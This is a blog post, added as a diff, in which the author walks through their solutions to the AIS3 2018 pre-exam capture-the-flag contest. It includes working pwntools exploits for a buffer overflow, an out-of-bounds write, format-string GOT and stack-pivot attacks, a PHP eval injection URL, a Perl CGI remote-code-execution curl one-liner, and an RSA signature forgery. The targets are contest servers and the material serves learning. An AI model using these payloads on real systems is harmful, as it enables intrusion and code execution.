@@ -1,0 +1,384 @@
+---
+title: "2018::AIS3::pre-exam"
+description: ""
+publishDate: "2018-06-13"
+category: "CTF"
+layout: "../../layouts/ArticleLayout.astro"
+---
+
+
+時隔一年又是 AIS3，去年因為去日本沒拿到結業證書，還沒打到 final，虧
+今年大家又跑來參加，反正暑假大概也是沒事做，看看這次 final 有沒有什麼好康的
+這次 pre-exam 成績上升到了 2nd ，本來可以再多解一題，總之又是粗心的壞習慣增加了構造 payload 的時間
+題目都還滿簡單的，有些題目滿有趣的
+
+先附上人權，聊天室好像有人以為我是出題者，我只是覺得抱怨題目可以，但是你要給出邏輯Ｒ
+大家都有解這題，都要花時間，就是有人解得快啊
+不然就倒著解，50 - 2 還有 48 分直接衝上第一Ｒ
+簡單的太難解，你有試過先解難的嗎
+
+<Image src="./scoreboard.png" alt="" />
+
+# Rev-1:find
+
+題目名字我有點忘了，應該是 find 拉，反正他就是一個什麼都沒有的 ELF 要你找 flag，就 strings 下去，就會發現一堆 `AIS3`，`ais3` 的字樣，小寫的都是一些對話，大寫的有一堆大括號，不過中間有偷夾個flag
+
+`AIS3{StrINg$_And_gR3P_I5_U$eFu1}`
+
+---
+# Rev-2:secret
+
+總之這程式裡面有個區塊是寫好的密文，從`init`可以發現他原始加密的方式就是`srand(0)`之後，一直呼叫`rand()%2018`然後`xor`後，就是這段`secret`的值，所以他程式才會一直要你輸入，只要你的輸入能夠還原當初他亂數的過程，`xor`出來的就會是`flag`，他會把解密的`flag`放到`/tmp/secret`裡面，原本程式的邏輯是這樣：
+<Image src="./rev2_origin.png" alt="" />
+
+從組語那邊把他 patch 成這樣：
+<Image src="./rev2_patch.png" alt="" />
+
+跑完就有 flag 了
+
+`AIS3{tHere_1s_a_VErY_VerY_VeRY_1OoO00O0oO0OOoO0Oo000OOoO00o00oG_f1@g_iN_my_m1Nd}`
+
+---
+# Rev-3:crackme
+
+就是一個 crackme 的樣子，.NET 寫的，用工具把 .NET 的 IR decompile 回類似 C# 的程式，就會找到關鍵的`xor`的部分，他裡面有一堆`yanny`，`laurel`之類的變數，寫個腳本讓每個變數 xor 171 就是 flag 了
+
+```python
+cipher = """// Token: 0x0400000A RID: 10\n\t\tprivate const int yanny = 234;\n\n\t\t// Token: 0x0400000B RID: 11\n\t\tprivate const int laurel = 226;\n\n\t\t// Token: 0x0400000C RID: 12\n\t\tprivate const int yammy = 248;\n\n\t\t// Token: 0x0400000D RID: 13\n\t\tprivate const int laurol = 152;\n\n\t\t// Token: 0x0400000E RID: 14\n\t\tprivate const int yommy = 208;\n\n\t\t// Token: 0x0400000F RID: 15\n\t\tprivate const int lourel = 154;\n\n\t\t// Token: 0x04000010 RID: 16\n\t\tprivate const int yonmy = 223;\n\n\t\t// Token: 0x04000011 RID: 17\n\t\tprivate const int lauril = 244;\n\n\t\t// Token: 0x04000012 RID: 18\n\t\tprivate const int yamny = 226;\n\n\t\t// Token: 0x04000013 RID: 19\n\t\tprivate const int laure1 = 158;\n\n\t\t// Token: 0x04000014 RID: 20\n\t\tprivate const int yanmy = 244;\n\n\t\t// Token: 0x04000015 RID: 21\n\t\tprivate const int lauro1 = 238;\n\n\t\t// Token: 0x04000016 RID: 22\n\t\tprivate const int yammi = 234;\n\n\t\t// Token: 0x04000017 RID: 23\n\t\tprivate const int loure1 = 216;\n\n\t\t// Token: 0x04000018 RID: 24\n\t\tprivate const int yemmy = 210;\n\n\t\t// Token: 0x04000019 RID: 25\n\t\tprivate const int leurel = 244;\n\n\t\t// Token: 0x0400001A RID: 26\n\t\tprivate const int yemny = 223;\n\n\t\t// Token: 0x0400001B RID: 27\n\t\tprivate const int leural = 228;\n\n\t\t// Token: 0x0400001C RID: 28\n\t\tprivate const int yenmy = 244;\n\n\t\t// Token: 0x0400001D RID: 29\n\t\tprivate const int leurol = 232;\n\n\t\t// Token: 0x0400001E RID: 30\n\t\tprivate const int yenny = 249;\n\n\t\t// Token: 0x0400001F RID: 31\n\t\tprivate const int leuro1 = 159;\n\n\t\t// Token: 0x04000020 RID: 32\n\t\tprivate const int yenmi = 200;\n\n\t\t// Token: 0x04000021 RID: 33\n\t\tprivate const int louro1 = 192;\n\n\t\t// Token: 0x04000022 RID: 34\n\t\tprivate const int yomny = 244;\n\n\t\t// Token: 0x04000023 RID: 35\n\t\tprivate const int leure1 = 230;\n\n\t\t// Token: 0x04000024 RID: 36\n\t\tprivate const int yonny = 206;\n\n\t\t// Token: 0x04000025 RID: 37\n\t\tprivate const int lauri1 = 138;\n\n\t\t// Token: 0x04000026 RID: 38\n\t\tprivate const int yamni = 214;""".split(' = ')[1:]
+
+flag =  ''.join(map(chr,[ int(x[:3])^171 for x in cipher]))
+
+print flag
+```
+
+`AIS3{1t_I5_EAsy_tO_CR4ck_Me!}`
+
+---
+
+# Rev-4:calc
+
+我還以為又是 windows 的計算機，原來是 Golang，他沒把 debug 訊息拿掉，看起來很快，程式要你輸入兩把 key ，然後把兩個陣列中的每個字元都對應相加，如果跟他程式內存的一個陣列相同的話 sever 就會把 flag 吐給你，輸入有限制，最長的 key 長度應該要是 0x19 ，這裡他題目有說 Unicode ，其實就是 Golang 中`rune`的特性，如果是用別的陣列，存取 Unicode 的時候會被拆解成多個 byte，但是`rune`會照著 Unicode 切，也就是`int32`的大小，而他程式中用來驗證的那個陣列也是`rune`，當中有包含 Unicode
+這題也不用去把它拆成兩把 key，就把第二把 key 空著，把它程式裡面那個數值直接當第一把 key 送進去就會過了
+然後因為 Golang 跟 gdb 之間有點小問題，所以用 gdb 在本地跑 payload 會跑不過
+
+```python 
+from pwn import *
+
+r = remote("104.199.235.135",2115)
+
+a = [u'\ufffd',u'\u006d',u'\ufffd',u'\u000f',u'\u006f',u'\u0058',u'\u0020',u'\u0031',u'\u0073',u'\u0020',u'\u0074',u'\u0048',u'\u0030',u'\u0000',u'\ufffd',u'\u0053',u'\u0074',u'\u0020',u'\u0063',u'\u0054',u'\u0046',u'\u0020',u'\u0074',u'\u003a',u'\u006d']
+
+print r.recvuntil(">")
+r.sendline("1")
+print r.recvuntil(">")
+r.sendline(''.join(a).encode("utf8"))
+print r.recvuntil(">")
+r.sendline()
+print r.recvuntil(">")
+r.sendline("2")
+r.interactive()
+```
+
+`AIS3{G0_gO_g0_T0_h1Gh_!!!_R3v3rs3_oN_g0lauG_p1narY_1s_3xHanst3d_Orz}`
+
+---
+
+# Pwn-1:mail
+
+程式有個 `reply` function，只要跳進去就給 flag，程式的輸入是用`gets`，直接 buffer overflow 就好了
+
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+
+r = remote("104.199.235.135",2111)
+
+reply = p64(0x400796)
+
+r.recvuntil("reciever: ")
+r.sendline("terrynini")
+r.recvuntil("content: ")
+r.sendline(cyclic(840)+reply)
+r.interactive()
+```
+
+`AIS3{3hY_d0_yOU_Kn0uu_tH3_r3p1Y?!_I_d0nt_3ant_t0_giu3_QwQ}`
+
+---
+
+# Pwn-2:darling
+
+忘記補進度了，考完段考來看 darling，這題只限制了上界沒限制下界，所以能夠改寫 stack ，雖然不能改掉現在這個 stack frame 的 return address，但是可以修改後面的，把 printf 的 return address 改掉就好了
+
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+
+r = remote("104.199.235.135", 2112)
+
+r.recvuntil("Index: ")
+r.sendline("-5")
+r.recvuntil("Code: ")
+r.sendline("4196310")
+r.interactive()
+```
+
+`AIS3{r3w3mpeR_t0_CH3cK_b0tH_uPb3r_b0nud_&_10w3r_bounp}`
+
+---
+
+# Pwn-3:justfmt
+
+這裡有 format string 的漏洞，我們可以把 got 表中的`vprintf`(`0x4f040`)修改成鄰近的`__libc_system`(`0x46590`)，不過從右邊數來第二個 byte 因為受到 ASLR 的影響要撞 $\frac\{1}\{16}$ 的機率
+
+```python
+#!/usr/bin/env python2
+from pwn import *
+
+while True:
+    try:
+        r = remote("104.199.235.135",2113)
+
+        print r.recvuntil(":")
+
+        plt = 0x601030
+        r.sendline("sh\n\n%21900c%8$hn"+p64(plt))
+        m = r.recvuntil(p64(plt))
+        r.sendline("ls")
+        m = r.recv()
+        r.interactive()
+        print m
+    except EOFError:
+        r.close()
+        print "try again"
+```
+
+`AIS3{fMt_stR1n6_1s_H4rp_s0w3t1meS_dnt_1ts_fnu!!}`
+
+---
+
+# Pwn-4:MagicWorld
+
+這題一樣有 format string 的問題，我們可以 leak 在 stack 上面`main`的 return address 來找到 `libc_start_main`，推算 libc base，然後找到 one gadget的位置
+在`Try a spell`選項裡面有多讀一個 byte，我們可以用這個 byte 來做 stack pivot，然後控制 rip 流程，跳到 one gadget 裡面，就可以拿到 shell 了
+
+```python
+#!/usr/bin/env python2
+from pwn import *
+
+while True:
+    try:
+        r = remote("104.199.235.135",2114)
+
+        magic = 0x46428
+
+        r.recvuntil("Choice: ")
+        r.sendline("1")
+        r.recvuntil("spell: ")
+        r.sendline("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p")
+        r.recvuntil("Regist: ")
+        r.sendline("2")
+        libc = r.recvuntil("\n")[-16:-1].split("x")
+        print libc
+        libc = int(libc[len(libc)-1],16)
+        print "libc_start_main: " +hex(libc)
+        libc =  libc - 0x21f45
+        magic = libc+magic
+        print "libc_base: " +hex(libc)
+        print "magic: " + hex(magic)
+
+        spell_rbp = p64(magic).ljust(16,"\0") + "h"
+        print spell_rbp
+        r.recvuntil("Give me your spell: ")
+        r.send(spell_rbp)
+        r.sendline("cat flag")
+        r.interactive()
+    except:
+        r.close()
+        print "try again"
+```
+
+`AIS3{m1gRatlon_&_b0f_13_Qu1t3_3asY!!!}`
+
+---
+
+# Crypto-1:POW
+
+總之讓你算 proof of work，為後面的題目做準備，然後我在聊天室有看到有人說 pool 對就會算得快，基本上這概念是錯的
+這裡的 proof of work 其實就是 hashcash 也就是 blockchain 裡面那個鬼東西，如果有個特定的 pool 算比較快......，可以讓我投資嗎？
+總之這邊就是 +1 +1 這樣慢慢算，不要用隨機的，程式裡的隨機是 pseudo random ，會一直撞到剛剛算過的值
+
+`AIS3{Spid3r mAn - H3L1O wOR1d PrO0F 0F WOrK}`
+
+---
+
+# Crypto-2:XOR
+
+他把明文跟 key 串接在一起，然後用 key 對這個新的字串做 xor 加密，`encrypt.py`中看得出來 key 的長度在 8~12，這種加密會造成的問題是，可以用最後 8~12 個字元，來推算出 key 的長度
+從 flag 形式可以知道明文開頭是 `AIS3{` ，用密文做 xor 得到 key 的前五個 byte，測試一下會發現 key 長度是 10 ，然後把 key 剩下的部分炸開就好了
+
+```python
+key = key[:5]
+for i in range(0,5):
+    for trial in range(0,256):
+        if chr(trial^ord(cipher[-6+i])) == key[-1]:
+            key += chr(trial)
+            print trial
+            break
+flag = ''.join(map(chr,[ ord(cipher[i])^ord(key[i%len(key)]) for i in range(len(cipher)) ])
+print flag
+```
+
+`AIS3{captAIn aMeric4 - Wh4T3V3R HapPenS t0mORr0w YOU mUst PR0Mis3 ME on3 tHIng. TH4T yOu WiLL stAY Who Y0U 4RE. Not A pERfect sO1dIER, buT 4 gOOD MAn.}`
+
+---
+
+# Crypto-3:IOU
+這題用 RSA 來 sign 一個借據，sign 跟 encrypt 的差別在於：sign 用私鑰加密即$m^\{d} \equiv c\;mod\;N$，encrypt 用公鑰加密即$m^\{e} \equiv c\;mod\;N$，所以這裡的 sign 其實沒用什麼特別的算法，官方也不推薦直接使用 sign ，應該要用 PKCS 之類的東西來簽才對
+
+這題的問題在於，他沒有驗證全部的訊息，他直接 split 找第四個元素，看他是不是 10，因此我們只要造假一個第四個元素 > 10 的明文就好了，要造假簽章我們要通過`key.verify`，但是因為我們有公鑰 (N, e)，我們可以逆過來玩，只要隨便亂弄一個密文`s`，就可以得到一個亂七八糟的明文 m = ($s^e$ mod N)，這東西一定會通過`key.verify`，然後有沒有通過 > 10 就是靠運氣，所以一直撞到過就會有 flag 了
+
+```python
+fake_s = ""
+c = 0
+while True:
+    try:
+        cc = int(''.join(c))
+        m = pow(cc, e, n)
+        test = long_to_bytes(m)
+        bucks = int(test.split()[3])
+        print bucks,
+        if bucks > 10:
+            fake_s = str(cc)
+            break
+    except EOFError:
+        break
+    except:
+        pass
+    c += 1
+
+print str(m)
+print fake_s 
+print "find"
+```
+
+`AIS3{D0cT0R StRaNG3 - F0rgERy ATTaCk Ag4InsT RSa DIgital SigNatUrE}`
+
+---
+# Crypto-4:EFAIL
+這題腳本寫到一半，總之利用 CBC 的弱點，在知道明文的情況下，我們可以替換密文來修改明文，例如我們有 $C_0, P_1, Fake$，我們把本來$C_0$的地方替換成$C_0 \oplus P_1 \oplus Fake$，這樣$C_1$解密完後會 xor 到錯誤的值，讓本來的 $C_0\oplus P_1$無法還原成$P_1$而變成$Fake$，然後他有提供`web`這個上網的指令，把flag前面改成`web 'mydoman.tw`，我們就可以去自己的 domain 撈到 flag，注意到後面過幾行有句英文有`'`，他會把這整段都當網址訪問，所以不用自己再加一個`'`來閉合
+
+---
+# Web-1:warmup
+
+連到 http://104.199.235.135:31331/index.php\?p=7 發現 header 裡面有一欄 `Partial-Flag:d`，推測 URL 裡面的 p 表示是 flag 中的第 p 個字元，所以變動 index 拼出 flag
+
+```sh
+for i in {0..50}
+do 
+    curl -v http://104.199.235.135:31331/index.php\?p\=$i 2>&1 | grep Flag | awk '{printf $3}' | tr -d '\r' >> flag.txt 
+done
+```
+`AIS3{g00d! u know how 2 check H3AD3R fie1ds.}`
+
+---
+# Web-2:hidden
+先到 `robots.txt` 會找到一個連結叫做 `_hidden_flag_.php`
+他會倒數個 1x 秒然後跳出一個按鈕到下一頁
+他其實送出了一個有兩個隱藏欄位 `c`，`s` 的表單，用來取得下次的 `c`，`s`值，直到某個關鍵點就會給 flag 了
+寫個腳本讓他飛一會兒，要跑 17xxx 次才結束
+
+
+```python
+import requests
+import re
+
+r = requests.get("http://104.199.235.135:31332/_hidden_flag_.php")
+
+while "no flag here" in r.text:
+    m = re.findall('value="([A-Za-z0-9]*)"',r.text)
+    for i in m:
+        print i
+    r = requests.post('http://104.199.235.135:31332/_hidden_flag_.php', data = {'c':m[0],'s':m[1]})
+    print r.text
+
+print  r.headers
+```
+
+`AIS3{g00d_u_know_how_2_script_4_W3B_3e02c41e2d6243765575b12442bc8480}`
+
+# Web-3:sushi
+
+題目是 `php`，關鍵的一行是他用`eval`包住了`die`，這裡我們可以用 php 神秘的特性，參考 Orange 的 [blog](http://blog.orange.tw/2012/11/phpconf-2012-security-in-php.html)
+其中`@`是用來抑制錯誤訊息，然後有限制字串長度不能超過 16 ，而且不可以包含 `'`，`"`
+先看目錄下有什麼檔案
+
+```
+http://104.199.235.135:31333/?%F0%9F%8D%A3=${@print(`ls`)}
+```
+
+目錄下有 `phpinfo.php`，`index.php`，`flag_name_1s_t00_l0ng_QAQQQQQQ`，這邊用低端解法，直接存取XDDD
+```
+http://104.199.235.135:31333/flag_name_1s_t00_l0ng_QAQQQQQQ
+```
+不過如果不幸的不能直接存取，其實可以用截斷的方式來讓 php 誤判我們放進去 GET 的字串長度，來進行任意長度的 command injection
+
+`AIS3{php_is_very_very_very_easyyyyyy}`
+
+# Web-4:perljam
+這題看起來空空如也，不過有 git leak 的問題，總之抓下來會找到一段關鍵的 upload 程式碼
+
+```perl
+use strict;
+use warnings;
+use CGI;
+my $cgi = CGI->new;
+print $cgi->header();
+print "<body style=\"background: #caccf7 url('https://i.imgur.com/Syv2IVk.png');padding: 30px;\">";
+print "<p style='color:red'>No BUG Q_____Q</p>";
+print "<br/>";
+print "<pre>";
+if( $cgi->upload('file') ) {
+        my $file = $cgi->param('file');
+        while(<$file>) {
+                print "$_";
+        }
+}
+print "</pre>";
+```
+可以參考 black hat 的一個[簡報](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf)，我們可以造假一個 file 來做到 RCE
+本題不能直接`cat flag`，權限不夠，在根目錄下面有支可以讀取 flag 的程式，我們要執行他來取得 flag
+```
+echo "trash" | curl -F "file=ARGV" -F "file=@-" "http://104.199.235.135:31334/cgi-bin/index.cgi?/readflag|"
+```
+
+`AIS3{here_is_your_flag}`
+
+---
+# Misc-1:welcome
+
+看教學影片，裡面有 flag
+
+`AIS3{Maybe_This_is_the_Flag_You_Want}`
+
+---
+# Misc-2:flag
+
+三隻假 flag，圖片上的，strings 出來的， pkcrack 出來的都是假的。
+本來就覺得他給的圖上的點點看起來很不整齊，猜測是摩斯電碼，吃完晚餐回來一下就過了，不過圖片是 jpeg 壓縮的關係有點模糊，總之對著翻譯出來就是 flag
+
+`AIS3{YOUFINDTHEREALFLAGOHYEAH}`
+
+---
+# Misc-3:svega
+
+mp3 音訊隱寫，用 [MP3stego](http://www.petitcolas.net/steganography/mp3stego/) 加密的，沒有設定 password ，decode 下去就是 flag
+
+`AIS3{I_HearD_imPlIeD_Fl46_1N_TH3_5oN6}`
+
+---
+# Misc-4:blind
+
+這題還沒來得及想，聽 Maojui 講了個大概，是有趣的一題。
